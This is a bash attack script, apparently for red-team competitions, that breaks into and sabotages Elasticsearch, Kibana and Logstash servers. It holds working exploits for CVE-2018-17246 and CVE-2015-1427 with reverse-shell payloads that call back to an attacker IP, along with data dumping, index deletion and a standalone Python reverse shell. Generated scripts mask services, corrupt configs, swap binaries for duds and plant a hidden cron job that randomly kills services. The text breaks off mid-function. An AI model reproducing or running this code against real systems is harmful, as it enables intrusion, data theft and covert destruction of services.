#!/bin/bash

# ELK Stack Attack Script
# For red team/cybersecurity competition purposes only

# Colors for better visibility
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
echo -e "${RED}"
echo "=========================================================="
echo "         ELK STACK PENETRATION TESTING SCRIPT             "
echo "      FOR EDUCATIONAL AND AUTHORIZED USE ONLY             "
echo "=========================================================="
echo -e "${NC}"

# Check if script is run as root
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}[!] This script must be run as root${NC}"
  exit 1
fi

# Dependency check and installation
check_dependencies() {
  echo -e "${BLUE}[*] Checking and installing required dependencies...${NC}"
  
  dependencies=("nmap" "python3" "python3-pip" "curl" "wget" "netcat-openbsd" "jq")
  
  for dep in "${dependencies[@]}"; do
    if ! command -v $dep &> /dev/null && ! dpkg -l | grep -q $dep; then
      echo -e "${YELLOW}[*] Installing $dep...${NC}"
      apt-get install -y $dep
    else
      echo -e "${GREEN}[✓] $dep already installed${NC}"
    fi
  done
  
  # Python dependencies
  echo -e "${BLUE}[*] Installing Python dependencies...${NC}"
  pip3 install requests elasticsearch python-nmap paramiko pycryptodome
  
  echo -e "${GREEN}[✓] All dependencies installed successfully${NC}"
}

# Target information gathering
target=""
domain=""
username=""
password=""
port_elastic=9200
port_kibana=5601
port_logstash=9600

gather_target_info() {
  echo -e "${BLUE}[*] Please provide target information:${NC}"
  
  read -p "Target IP address: " target
  read -p "Domain (optional, press Enter to skip): " domain
  read -p "Port for Elasticsearch [default: 9200]: " input_port_elastic
  read -p "Port for Kibana [default: 5601]: " input_port_kibana
  read -p "Port for Logstash [default: 9600]: " input_port_logstash
  read -p "Username (optional, press Enter if unknown): " username
  read -p "Password (optional, press Enter if unknown): " password
  
  # Use provided ports or defaults
  port_elastic=${input_port_elastic:-9200}
  port_kibana=${input_port_kibana:-5601}
  port_logstash=${input_port_logstash:-9600}
  
  echo -e "${GREEN}[✓] Target information gathered${NC}"
}

# Basic recon
recon() {
  echo -e "\n${BLUE}[*] Starting reconnaissance on target: $target${NC}"
  
  # Check if host is up
  if ping -c 1 $target &> /dev/null; then
    echo -e "${GREEN}[✓] Host is up and reachable${NC}"
  else
    echo -e "${YELLOW}[!] Host seems to be down or blocking ICMP. Continuing anyway...${NC}"
  fi
  
  # Perform quick port scan
  echo -e "${BLUE}[*] Performing quick port scan...${NC}"
  nmap -T4 -F $target -oN quick_scan.txt
  
  # More detailed scan on specific ELK ports
  echo -e "${BLUE}[*] Scanning ELK stack specific ports...${NC}"
  nmap -sV -p $port_elastic,$port_kibana,$port_logstash $target -oN elk_scan.txt
  
  # Check if ES is running and get version info
  echo -e "${BLUE}[*] Checking Elasticsearch availability...${NC}"
  es_response=$(curl -s -m 10 http://$target:$port_elastic)
  
  if [[ $es_response == *"version"* ]]; then
    echo -e "${GREEN}[✓] Elasticsearch is accessible${NC}"
    es_version=$(echo $es_response | jq -r '.version.number' 2>/dev/null)
    if [[ ! -z "$es_version" ]]; then
      echo -e "${GREEN}[+] Elasticsearch version: $es_version${NC}"
    fi
  else
    echo -e "${YELLOW}[!] Elasticsearch not accessible on port $port_elastic${NC}"
  fi
  
  # Check Kibana
  echo -e "${BLUE}[*] Checking Kibana availability...${NC}"
  if curl -s -m 10 http://$target:$port_kibana -I | grep -q "kbn-name"; then
    echo -e "${GREEN}[✓] Kibana is accessible${NC}"
    
    # Try to get Kibana version
    kibana_version=$(curl -s -m 10 http://$target:$port_kibana/api/status | jq -r '.version.number' 2>/dev/null)
    if [[ ! -z "$kibana_version" ]]; then
      echo -e "${GREEN}[+] Kibana version: $kibana_version${NC}"
    fi
  else
    echo -e "${YELLOW}[!] Kibana not accessible on port $port_kibana${NC}"
  fi
  
  # Check Logstash
  echo -e "${BLUE}[*] Checking Logstash availability...${NC}"
  logstash_response=$(curl -s -m 10 http://$target:$port_logstash)
  if [[ $logstash_response == *"logstash"* ]]; then
    echo -e "${GREEN}[✓] Logstash API is accessible${NC}"
  else
    echo -e "${YELLOW}[!] Logstash API not accessible on port $port_logstash${NC}"
  fi
}

# Function to check for and potentially exploit CVE-2018-17246 (Kibana LFI)
check_kibana_lfi() {
  echo -e "\n${BLUE}[*] Checking for Kibana LFI vulnerability (CVE-2018-17246)...${NC}"
  
  # Test payload for Kibana < 6.4.3 and 5.6.13
  payload="/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../etc/passwd"
  
  response=$(curl -s -m 10 "http://$target:$port_kibana$payload")
  
  if [[ $response == *"root:"* ]]; then
    echo -e "${GREEN}[+] Target is VULNERABLE to Kibana LFI (CVE-2018-17246)!${NC}"
    echo -e "${GREEN}[+] Successfully read /etc/passwd:${NC}"
    echo "$response" | head -10
    
    # RCE via LFI
    echo -e "${BLUE}[*] Attempting Remote Code Execution via LFI...${NC}"
    
    # Create JS payload
    cat > /tmp/kibana_rce.js << EOL
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "$target", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
EOL
    
    # Start listener
    echo -e "${BLUE}[*] Starting netcat listener on port 4444${NC}"
    echo -e "${YELLOW}[!] Run this in another terminal: nc -lvnp 4444${NC}"
    sleep 5
    
    # Send RCE payload
    echo -e "${BLUE}[*] Sending RCE payload...${NC}"
    curl -s -m 10 "http://$target:$port_kibana/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../tmp/kibana_rce.js" &
    
    echo -e "${GREEN}[+] Check your listener for a shell connection${NC}"
    
    return 0
  else
    echo -e "${YELLOW}[!] Target does not appear vulnerable to Kibana LFI${NC}"
    return 1
  fi
}

# Function to check and exploit Elasticsearch CVEs
check_elastic_vulns() {
  echo -e "\n${BLUE}[*] Checking for Elasticsearch vulnerabilities...${NC}"
  
  # Check for open ES without authentication
  echo -e "${BLUE}[*] Testing for unauthenticated access...${NC}"
  es_indices=$(curl -s -m 10 http://$target:$port_elastic/_cat/indices)
  
  if [[ ! -z "$es_indices" && "$es_indices" != *"unauthorized"* ]]; then
    echo -e "${GREEN}[+] Elasticsearch has NO AUTHENTICATION!${NC}"
    echo -e "${GREEN}[+] Available indices:${NC}"
    echo "$es_indices"
    
    # Attempt to dump data from the first index
    first_index=$(echo "$es_indices" | awk '{print $3}' | head -1)
    if [[ ! -z "$first_index" ]]; then
      echo -e "${BLUE}[*] Dumping sample data from index: $first_index${NC}"
      curl -s -m 10 "http://$target:$port_elastic/$first_index/_search?size=5" | jq .
    fi
    
    # Check if we can create a user/data (for admin access)
    echo -e "${BLUE}[*] Testing if we can write to Elasticsearch...${NC}"
    write_test=$(curl -s -X PUT "http://$target:$port_elastic/security_test/user/1" -H 'Content-Type: application/json' -d '{"name": "test_user", "password": "RedTeam123!"}')
    
    if [[ "$write_test" == *"created"* || "$write_test" == *"updated"* ]]; then
      echo -e "${GREEN}[+] We have WRITE ACCESS to Elasticsearch!${NC}"
      echo -e "${GREEN}[+] You can manipulate or delete indices${NC}"
      
      # Provide option to manipulate data
      read -p "Do you want to delete an index as proof of concept? (y/n): " delete_confirm
      if [[ "$delete_confirm" == "y" ]]; then
        read -p "Enter index name to delete: " index_to_delete
        delete_result=$(curl -s -X DELETE "http://$target:$port_elastic/$index_to_delete")
        echo -e "${RED}[!] Deletion result: $delete_result${NC}"
      fi
    else
      echo -e "${YELLOW}[!] No write access to Elasticsearch${NC}"
    fi
    
    return 0
  else
    echo -e "${YELLOW}[!] Elasticsearch requires authentication${NC}"
    
    # If credentials were provided, try them
    if [[ ! -z "$username" && ! -z "$password" ]]; then
      echo -e "${BLUE}[*] Trying provided credentials...${NC}"
      auth_test=$(curl -s -u "$username:$password" -m 10 http://$target:$port_elastic/_cat/indices)
      
      if [[ ! -z "$auth_test" && "$auth_test" != *"unauthorized"* ]]; then
        echo -e "${GREEN}[+] Authentication successful!${NC}"
        echo -e "${GREEN}[+] Available indices:${NC}"
        echo "$auth_test"
        return 0
      else
        echo -e "${YELLOW}[!] Authentication failed${NC}"
      fi
    fi
  fi
  
  # Check for CVE-2015-1427 (Elasticsearch < 1.3.8 and 1.4.3 RCE)
  echo -e "${BLUE}[*] Checking for Elasticsearch RCE (CVE-2015-1427)...${NC}"
  groovy_payload='{"size":1, "script_fields": {"exploitField": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").text"}}}'
  
  rce_test=$(curl -s -m 10 -X POST "http://$target:$port_elastic/_search" -H "Content-Type: application/json" -d "$groovy_payload")
  
  if [[ "$rce_test" == *"root:"* ]]; then
    echo -e "${GREEN}[+] Target is VULNERABLE to Elasticsearch RCE (CVE-2015-1427)!${NC}"
    echo -e "${GREEN}[+] Command output:${NC}"
    echo "$rce_test" | jq .
    
    # Provide option for reverse shell
    echo -e "${BLUE}[*] Setting up reverse shell payload...${NC}"
    read -p "Enter your attacking machine IP: " attacker_ip
    read -p "Enter your listener port: " attacker_port
    
    rev_shell_payload='{"size":1, "script_fields": {"exploitField": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8'$attacker_ip'/'$attacker_port'IDA+JjE=}|{base64,-d}|{bash,-i}\").text"}}}'
    
    echo -e "${YELLOW}[!] Make sure you have a listener running with: nc -lvnp $attacker_port${NC}"
    sleep 3
    
    echo -e "${BLUE}[*] Sending reverse shell payload...${NC}"
    curl -s -m 10 -X POST "http://$target:$port_elastic/_search" -H "Content-Type: application/json" -d "$rev_shell_payload" &
    
    return 0
  else
    echo -e "${YELLOW}[!] Target does not appear vulnerable to Elasticsearch RCE${NC}"
    return 1
  fi
}

# Function to attempt to disable services covertly
disable_services() {
  echo -e "\n${BLUE}[*] Attempting to disable services covertly...${NC}"
  echo -e "${YELLOW}[!] WARNING: This will attempt to gain shell access and disable services${NC}"
  read -p "Continue? (y/n): " disable_confirm
  
  if [[ "$disable_confirm" != "y" ]]; then
    echo -e "${YELLOW}[!] Skipping service disruption${NC}"
    return 1
  fi
  
  echo -e "${BLUE}[*] Choose disruption method:${NC}"
  echo "1. Create systemd mask for ELK services"
  echo "2. Modify configuration files to break services"
  echo "3. Replace service binaries with duds"
  echo "4. Advanced (Create cron job to randomly kill services)"
  read -p "Select option (1-4): " disrupt_option
  
  case $disrupt_option in
    1)
      cat > /tmp/disable_elk.py << EOL
#!/usr/bin/env python3
import os
import paramiko
import time
import sys

def ssh_connect(host, username, password=None, key_file=None):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        if password:
            ssh.connect(host, username=username, password=password, timeout=10)
        elif key_file:
            key = paramiko.RSAKey.from_private_key_file(key_file)
            ssh.connect(host, username=username, pkey=key, timeout=10)
        else:
            print("[!] No authentication method provided")
            return None
        
        print(f"[+] Successfully connected to {host} as {username}")
        return ssh
    except Exception as e:
        print(f"[!] Connection failed: {str(e)}")
        return None

def execute_command(ssh, command):
    print(f"[*] Executing: {command}")
    stdin, stdout, stderr = ssh.exec_command(command)
    output = stdout.read().decode('utf-8')
    error = stderr.read().decode('utf-8')
    
    if error:
        print(f"[!] Error: {error}")
    
    return output

def mask_services(ssh):
    print("[*] Attempting to mask ELK services...")
    services = ["elasticsearch.service", "kibana.service", "logstash.service"]
    
    for service in services:
        # First check if service exists
        check_cmd = f"systemctl is-active {service} || echo 'not-found'"
        result = execute_command(ssh, check_cmd)
        
        if "not-found" in result:
            print(f"[!] Service {service} not found")
            continue
        
        # Mask the service
        mask_cmd = f"sudo systemctl mask {service}"
        execute_command(ssh, mask_cmd)
        
        # Verify masking worked
        verify_cmd = f"systemctl is-enabled {service}"
        result = execute_command(ssh, verify_cmd)
        
        if "masked" in result:
            print(f"[+] Successfully masked {service}")
        else:
            print(f"[!] Failed to mask {service}")

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <username> [password/key_file] [is_key_file]")
        sys.exit(1)
    
    host = sys.argv[1]
    username = sys.argv[2]
    auth = sys.argv[3] if len(sys.argv) > 3 else None
    is_key_file = True if len(sys.argv) > 4 and sys.argv[4].lower() == 'true' else False
    
    ssh = None
    if is_key_file:
        ssh = ssh_connect(host, username, key_file=auth)
    else:
        ssh = ssh_connect(host, username, password=auth)
    
    if ssh:
        mask_services(ssh)
        ssh.close()

if __name__ == "__main__":
    main()
EOL
      chmod +x /tmp/disable_elk.py
      
      echo -e "${BLUE}[*] Script created at /tmp/disable_elk.py${NC}"
      echo -e "${YELLOW}[!] To use:${NC}"
      echo -e "python3 /tmp/disable_elk.py <target_ip> <username> <password>"
      echo -e "OR"
      echo -e "python3 /tmp/disable_elk.py <target_ip> <username> <key_file> true"
      ;;
      
    2)
      cat > /tmp/modify_configs.py << EOL
#!/usr/bin/env python3
import os
import paramiko
import sys

def ssh_connect(host, username, password=None, key_file=None):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        if password:
            ssh.connect(host, username=username, password=password, timeout=10)
        elif key_file:
            key = paramiko.RSAKey.from_private_key_file(key_file)
            ssh.connect(host, username=username, pkey=key, timeout=10)
        else:
            print("[!] No authentication method provided")
            return None
        
        print(f"[+] Successfully connected to {host} as {username}")
        return ssh
    except Exception as e:
        print(f"[!] Connection failed: {str(e)}")
        return None

def execute_command(ssh, command):
    print(f"[*] Executing: {command}")
    stdin, stdout, stderr = ssh.exec_command(command)
    output = stdout.read().decode('utf-8')
    error = stderr.read().decode('utf-8')
    
    if error:
        print(f"[!] Error: {error}")
    
    return output

def corrupt_config_files(ssh):
    # Get configuration file locations
    print("[*] Finding ELK configuration files...")
    
    # Check common paths
    paths = {
        "elasticsearch": ["/etc/elasticsearch/elasticsearch.yml", "/usr/share/elasticsearch/config/elasticsearch.yml"],
        "kibana": ["/etc/kibana/kibana.yml", "/usr/share/kibana/config/kibana.yml"],
        "logstash": ["/etc/logstash/logstash.yml", "/usr/share/logstash/config/logstash.yml"]
    }
    
    for service, file_paths in paths.items():
        for path in file_paths:
            check_cmd = f"test -f {path} && echo 'found' || echo 'not-found'"
            result = execute_command(ssh, check_cmd)
            
            if "found" in result:
                print(f"[+] Found {service} config at {path}")
                
                # Backup the file first (for demonstration - in real attack might skip this)
                backup_cmd = f"sudo cp {path} {path}.bak"
                execute_command(ssh, backup_cmd)
                
                # Create corrupted config - add invalid setting and comment out important ones
                if service == "elasticsearch":
                    corrupt_cmd = f"""sudo sh -c 'echo "# Corrupted by attacker
invalid.setting: true
#cluster.name: my-cluster
path.data: /dev/null" > {path}'"""
                elif service == "kibana":
                    corrupt_cmd = f"""sudo sh -c 'echo "# Corrupted by attacker
server.invalid: true
#server.port: 5601
#elasticsearch.hosts: [\"http://localhost:9200\"]" > {path}'"""
                elif service == "logstash":
                    corrupt_cmd = f"""sudo sh -c 'echo "# Corrupted by attacker
invalid.setting: true
#path.config: /etc/logstash/conf.d
path.logs: /dev/null" > {path}'"""
                
                execute_command(ssh, corrupt_cmd)
                print(f"[+] Modified {service} configuration")
                
                # Change permissions to make it harder to fix
                chmod_cmd = f"sudo chmod 600 {path}"
                execute_command(ssh, chmod_cmd)
                
                break

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <username> [password/key_file] [is_key_file]")
        sys.exit(1)
    
    host = sys.argv[1]
    username = sys.argv[2]
    auth = sys.argv[3] if len(sys.argv) > 3 else None
    is_key_file = True if len(sys.argv) > 4 and sys.argv[4].lower() == 'true' else False
    
    ssh = None
    if is_key_file:
        ssh = ssh_connect(host, username, key_file=auth)
    else:
        ssh = ssh_connect(host, username, password=auth)
    
    if ssh:
        corrupt_config_files(ssh)
        ssh.close()

if __name__ == "__main__":
    main()
EOL
      chmod +x /tmp/modify_configs.py
      
      echo -e "${BLUE}[*] Config modification script created at /tmp/modify_configs.py${NC}"
      echo -e "${YELLOW}[!] To use:${NC}"
      echo -e "python3 /tmp/modify_configs.py <target_ip> <username> <password>"
      echo -e "OR"
      echo -e "python3 /tmp/modify_configs.py <target_ip> <username> <key_file> true"
      ;;
      
    3)
      cat > /tmp/replace_binaries.py << EOL
#!/usr/bin/env python3
import os
import paramiko
import sys

def ssh_connect(host, username, password=None, key_file=None):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        if password:
            ssh.connect(host, username=username, password=password, timeout=10)
        elif key_file:
            key = paramiko.RSAKey.from_private_key_file(key_file)
            ssh.connect(host, username=username, pkey=key, timeout=10)
        else:
            print("[!] No authentication method provided")
            return None
        
        print(f"[+] Successfully connected to {host} as {username}")
        return ssh
    except Exception as e:
        print(f"[!] Connection failed: {str(e)}")
        return None

def execute_command(ssh, command):
    print(f"[*] Executing: {command}")
    stdin, stdout, stderr = ssh.exec_command(command)
    output = stdout.read().decode('utf-8')
    error = stderr.read().decode('utf-8')
    
    if error and error.strip() != "":
        print(f"[!] Error: {error}")
    
    return output

def replace_binaries(ssh):
    # Find ELK binary locations
    print("[*] Finding ELK binaries...")
    
    # Find binary paths
    find_es_cmd = "which elasticsearch || find /usr/share -name elasticsearch -type f 2>/dev/null | grep bin"
    find_kibana_cmd = "which kibana || find /usr/share -name kibana -type f 2>/dev/null | grep bin"
    find_logstash_cmd = "which logstash || find /usr/share -name logstash -type f 2>/dev/null | grep bin"
    
    es_bin = execute_command(ssh, find_es_cmd).strip()
    kibana_bin = execute_command(ssh, find_kibana_cmd).strip()
    logstash_bin = execute_command(ssh, find_logstash_cmd).strip()
    
    # Create dummy binary content
    dummy_script = '''#!/bin/bash
# This binary was replaced by attacker
echo "Error: Service unavailable - corrupt binary" >&2
exit 1
'''
    
    # Create a temporary script file
    with open("/tmp/dummy_bin", "w") as f:
        f.write(dummy_script)
    
    # Create an SFTP client
    sftp = ssh.open_sftp()
    
    # Replace binaries if found
    for service, path in [("elasticsearch", es_bin), ("kibana", kibana_bin), ("logstash", logstash_bin)]:
        if path:
            print(f"[+] Found {service} binary at {path}")
            
            # Backup original binary
            backup_cmd = f"sudo cp {path} {path}.bak"
            execute_command(ssh, backup_cmd)
            
            try:
                # Upload dummy script
                sftp.put("/tmp/dummy_bin", f"/tmp/{service}_dummy")
                execute_command(ssh, f"sudo chmod +x /tmp/{service}_dummy")
                execute_command(ssh, f"sudo mv /tmp/{service}_dummy {path}")
                print(f"[+] Successfully replaced {service} binary")
            except Exception as e:
                print(f"[!] Failed to replace {service} binary: {str(e)}")
        else:
            print(f"[!] Could not find {service} binary")
    
    sftp.close()
    os.remove("/tmp/dummy_bin")

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <username> [password/key_file] [is_key_file]")
        sys.exit(1)
    
    host = sys.argv[1]
    username = sys.argv[2]
    auth = sys.argv[3] if len(sys.argv) > 3 else None
    is_key_file = True if len(sys.argv) > 4 and sys.argv[4].lower() == 'true' else False
    
    ssh = None
    if is_key_file:
        ssh = ssh_connect(host, username, key_file=auth)
    else:
        ssh = ssh_connect(host, username, password=auth)
    
    if ssh:
        replace_binaries(ssh)
        ssh.close()

if __name__ == "__main__":
    main()
EOL
      chmod +x /tmp/replace_binaries.py
      
      echo -e "${BLUE}[*] Binary replacement script created at /tmp/replace_binaries.py${NC}"
      echo -e "${YELLOW}[!] To use:${NC}"
      echo -e "python3 /tmp/replace_binaries.py <target_ip> <username> <password>"
      echo -e "OR"
      echo -e "python3 /tmp/replace_binaries.py <target_ip> <username> <key_file> true"
      ;;
      
    4)
      cat > /tmp/advanced_disruption.py << EOL
#!/usr/bin/env python3
import os
import paramiko
import sys

def ssh_connect(host, username, password=None, key_file=None):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        if password:
            ssh.connect(host, username=username, password=password, timeout=10)
        elif key_file:
            key = paramiko.RSAKey.from_private_key_file(key_file)
            ssh.connect(host, username=username, pkey=key, timeout=10)
        else:
            print("[!] No authentication method provided")
            return None
        
        print(f"[+] Successfully connected to {host} as {username}")
        return ssh
    except Exception as e:
        print(f"[!] Connection failed: {str(e)}")
        return None

def execute_command(ssh, command):
    print(f"[*] Executing: {command}")
    stdin, stdout, stderr = ssh.exec_command(command)
    output = stdout.read().decode('utf-8')
    error = stderr.read().decode('utf-8')
    
    if error and error.strip() != "":
        print(f"[!] Error: {error}")
    
    return output

def install_cron_job(ssh):
    print("[*] Setting up advanced disruption via cron job...")
    
    # Create a script that will randomly kill ELK services
    disruptor_script = '''#!/bin/bash

# This script randomly disrupts ELK services
LOG_FILE="/dev/null"  # Change to hide activity

# Choose a random service to target
services=("elasticsearch" "kibana" "logstash")
target=${services[$RANDOM % ${#services[@]}]}

# Get process IDs for the target service
pids=$(pgrep -f $target)

if [ -n "$pids" ]; then
    # Log action
    echo "[$(date)] Disrupting $target" >> $LOG_FILE
    
    # Choose disruption method randomly
    method=$((RANDOM % 3))
    
    case $method in
        0)
            # Kill the process
            kill -9 $pids
            echo "[$(date)] Killed $target (PIDs: $pids)" >> $LOG_FILE
            ;;
        1)
            # Corrupt configuration
            if [ "$target" == "elasticsearch" ]; then
                conf_file="/etc/elasticsearch/elasticsearch.yml"
                if [ -f "$conf_file" ]; then
                    # Add invalid settings
                    echo "invalid.setting: true" >> $conf_file
                    echo "[$(date)] Corrupted $target config" >> $LOG_FILE
                fi
            elif [ "$target" == "kibana" ]; then
                conf_file="/etc/kibana/kibana.yml"
                if [ -f "$conf_file" ]; then
                    echo "server.invalid: true" >> $conf_file
                    echo "[$(date)] Corrupted $target config" >> $LOG_FILE
                fi
            elif [ "$target" == "logstash" ]; then
                conf_file="/etc/logstash/logstash.yml"
                if [ -f "$conf_file" ]; then
                    echo "invalid.setting: true" >> $conf_file
                    echo "[$(date)] Corrupted $target config" >> $LOG_FILE
                fi
            fi
            ;;
        2)
            # Modify system resources
            for pid in $pids; do
                if [ -d "/proc/$pid" ]; then
                    # Set CPU affinity to single core
                    taskset -p 0x1 $pid &>/dev/null
                    # Reduce process priority
                    renice +19 -p $pid &>/dev/null
                    echo "[$(date)] Limited resources for $target (PID: $pid)" >> $LOG_FILE
                fi
            done
            ;;
    esac
else
    echo "[$(date)] $target not running" >> $LOG_FILE
fi

# Sometimes corrupt JVM options
if [ $((RANDOM % 10)) -eq 0 ]; then
    jvm_opts="/etc/elasticsearch/jvm.options"
    if [ -f "$jvm_opts" ]; then
        # Comment out memory settings
        sed -i 's/^-Xms/-#Xms/' $jvm_opts
        sed -i 's/^-Xmx/-#Xmx/' $jvm_opts
        echo "[$(date)] Corrupted JVM options" >> $LOG_FILE
    fi
fi

exit 0
'''
    
    # Upload the disruptor script
    with open("/tmp/elk_disruptor.sh", "w") as f:
        f.write(disruptor_script)
    
    sftp = ssh.open_sftp()
    sftp.put("/tmp/elk_disruptor.sh", "/tmp/elk_disruptor.sh")
    execute_command(ssh, "chmod +x /tmp/elk_disruptor.sh")
    
    # Move to hidden location
    execute_command(ssh, "sudo mkdir -p /usr/local/.maintenance")
    execute_command(ssh, "sudo mv /tmp/elk_disruptor.sh /usr/local/.maintenance/")
    
    # Set up cron job to run every 30 minutes
    cron_entry = "*/30 * * * * /usr/local/.maintenance/elk_disruptor.sh >/dev/null 2>&1"
    execute_command(ssh, f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -')
    
    print("[+] Advanced disruption installed successfully")
    print("[+] ELK services will be randomly disrupted every 30 minutes")
    
    # Clean up
    os.remove("/tmp/elk_disruptor.sh")
    sftp.close()

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <username> [password/key_file] [is_key_file]")
        sys.exit(1)
    
    host = sys.argv[1]
    username = sys.argv[2]
    auth = sys.argv[3] if len(sys.argv) > 3 else None
    is_key_file = True if len(sys.argv) > 4 and sys.argv[4].lower() == 'true' else False
    
    ssh = None
    if is_key_file:
        ssh = ssh_connect(host, username, key_file=auth)
    else:
        ssh = ssh_connect(host, username, password=auth)
    
    if ssh:
        install_cron_job(ssh)
        ssh.close()

if __name__ == "__main__":
    main()
EOL
      chmod +x /tmp/advanced_disruption.py
      
      echo -e "${BLUE}[*] Advanced disruption script created at /tmp/advanced_disruption.py${NC}"
      echo -e "${YELLOW}[!] To use:${NC}"
      echo -e "python3 /tmp/advanced_disruption.py <target_ip> <username> <password>"
      echo -e "OR"
      echo -e "python3 /tmp/advanced_disruption.py <target_ip> <username> <key_file> true"
      ;;
      
    *)
      echo -e "${RED}[!] Invalid option${NC}"
      ;;
  esac
}

# Function to check for Logstash vulnerabilities
check_logstash_vulns() {
  echo -e "\n${BLUE}[*] Checking for Logstash vulnerabilities...${NC}"
  
  # Check if Logstash API is accessible
  echo -e "${BLUE}[*] Testing Logstash API access...${NC}"
  ls_response=$(curl -s -m 10 http://$target:$port_logstash)
  
  if [[ ! -z "$ls_response" ]]; then
    echo -e "${GREEN}[+] Logstash API is accessible${NC}"
    
    # Check if we can get node info
    node_info=$(curl -s -m 10 http://$target:$port_logstash/_node)
    
    if [[ ! -z "$node_info" && "$node_info" == *"version"* ]]; then
      echo -e "${GREEN}[+] Got Logstash node info:${NC}"
      echo "$node_info" | jq .
      
      # Try to get pipeline info
      pipeline_info=$(curl -s -m 10 http://$target:$port_logstash/_node/pipelines)
      
      if [[ ! -z "$pipeline_info" && "$pipeline_info" == *"pipelines"* ]]; then
        echo -e "${GREEN}[+] Got pipeline information:${NC}"
        echo "$pipeline_info" | jq .
        
        # Check for pipeline file paths
        if [[ "$pipeline_info" == *"config_path"* ]]; then
          echo -e "${GREEN}[+] Pipeline configuration paths found${NC}"
          echo -e "${YELLOW}[!] These could be potential targets for modification${NC}"
        fi
      fi
    fi
    
    return 0
  else
    echo -e "${YELLOW}[!] Logstash API not accessible${NC}"
    return 1
  fi
}

# Function for full system compromise via any available vulnerability
attempt_full_compromise() {
  echo -e "\n${BLUE}[*] Attempting full system compromise...${NC}"
  
  # Create a collection of payloads for different vulnerabilities
  
  # Reverse shell payload script
  cat > /tmp/reverse_shell.py << EOL
#!/usr/bin/env python3
import socket
import subprocess
import os
import sys

def reverse_shell(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/bash", "-i"])
    except Exception as e:
        print(f"Error: {str(e)}")
        return False
    return True

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 reverse_shell.py <attacker_ip> <attacker_port>")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = sys.argv[2]
    reverse_shell(ip, port)
EOL
  chmod +x /tmp/reverse_shell.py
  
  # Create helper script for ELK exploitation
  cat > /tmp/elk_exploiter.py << EOL
#!/usr/bin/env python3
import requests
import sys
import json
import time
import base64
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ELKExploiter:
    def __init__(self, target, elastic_port=9200, kibana_port=5601, logstash_port=9600):
        self.target = target
        self.elastic_port = elastic_port
        self.kibana_port = kibana_port
        self.logstash_port = logstash_port
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 10
    
    def check_elk_versions(self):
        print("[*] Checking ELK stack versions...")
        versions = {}
        
        # Check Elasticsearch
        try:
            res = self.session.get(f"http://{self.target}:{self.elastic_port}")
            if res.status_code == 200:
                data = res.json()
                if 'version' in data and 'number' in data['version']:
                    versions['elasticsearch'] = data['version']['number']
                    print(f"[+] Elasticsearch version: {versions['elasticsearch']}")
                else:
                    print("[!] Couldn't determine Elasticsearch version")
        except Exception as e:
            print(f"[!] Error checking Elasticsearch: {str(e)}")
        
        # Check Kibana
        try:
            res = self.session.get(f"http://{self.target}:{self.kibana_port}/api/status")
            if res.status_code == 200:
                data = res.json()
                if 'version' in data and 'number' in data['version']:
                    versions['kibana'] = data['version']['number']
                    print(f"[+] Kibana version: {versions['kibana']}")
                else:
                    print("[!] Couldn't determine Kibana version")
        except Exception as e:
            print(f"[!] Error checking Kibana: {str(e)}")
        
        # Check Logstash
        try:
            res = self.session.get(f"http://{self.target}:{self.logstash_port}")
            if res.status_code == 200:
                try:
                    data = res.json()
                    if 'version' in data:
                        versions['logstash'] = data['version']
                        print(f"[+] Logstash version: {versions['logstash']}")
                    else:
                        print("[!] Couldn't determine Logstash version")
                except:
                    print("[!] Couldn't parse Logstash response")
        except Exception as e:
            print(f"[!] Error checking Logstash: {str(e)}")
        
        return versions
    
    def exploit_kibana_lfi(self, attacker_ip, attacker_port):
        print("[*] Attempting Kibana LFI exploit (CVE-2018-17246)...")
        
        # Create payload
        payload_path = "/tmp/kibana_rce.js"
        payload = f"""
(function(){{
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({attacker_port}, "{attacker_ip}", function(){{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/;
}})();
        """
        
        with open(payload_path, "w") as f:
            f.write(payload)
        
        print(f"[+] Created payload at {payload_path}")
        print(f"[!] Start a listener with: nc -lvnp {attacker_port}")
        input("Press Enter when your listener is ready...")
        
        try:
            print("[*] Sending exploit...")
            res = self.session.get(f"http://{self.target}:{self.kibana_port}/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../..{payload_path}")
            print(f"[*] Exploit sent with status code: {res.status_code}")
            print("[*] Check your listener for a connection")
            
            return True
        except Exception as e:
